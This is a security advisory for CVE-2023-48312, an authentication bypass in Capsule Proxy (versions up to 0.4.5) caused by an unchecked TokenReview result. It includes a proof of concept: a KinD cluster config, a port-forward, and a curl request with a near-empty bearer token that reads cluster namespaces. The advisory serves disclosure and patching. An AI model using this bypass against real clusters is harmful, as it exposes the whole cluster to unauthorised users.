# Capsule Proxy Authentication bypass using an empty token

**GHSA**: GHSA-fpvw-6m5v-hqfp | **CVE**: CVE-2023-48312 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-287

**Affected Packages**:
- **github.com/projectcapsule/capsule-proxy** (go): <= 0.4.5
- **github.com/clastix/capsule-proxy** (go): <= 0.4.5

## Description

The privilege escalation is based on a missing check if the user is authenticated based on the `TokenReview` result.

All the clusters running with the `anonymous-auth` Kubernetes API Server setting disable (set to `false`) are affected since it would be possible to bypass the token review mechanism, interacting with the upper Kubernetes API Server.

# PoC

Start a KinD cluster with the `anonymous-auth` value to `false`. 
If it is true, it uses anonymous permissions which are very limited by default

```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    apiServer:
        extraArgs:
          anonymous-auth: "false"
```

Install `capsule` and `capsule-proxy`

```
k port-forward svc/capsule-proxy 9001    
Forwarding from 127.0.0.1:9001 -> 9001
Forwarding from [::1]:9001 -> 9001
Handling connection for 9001
```

Then query the proxy
```
curl -g -k -H 'Authorization: Bearer   f' -X 'GET' 'https://localhost:9001/api/v1/namespaces'
```

# Impact

The whole cluster is exposed to unauthorised users.

This privilege escalation cannot be exploited if you're relying only on client certificates (SSL/TLS).
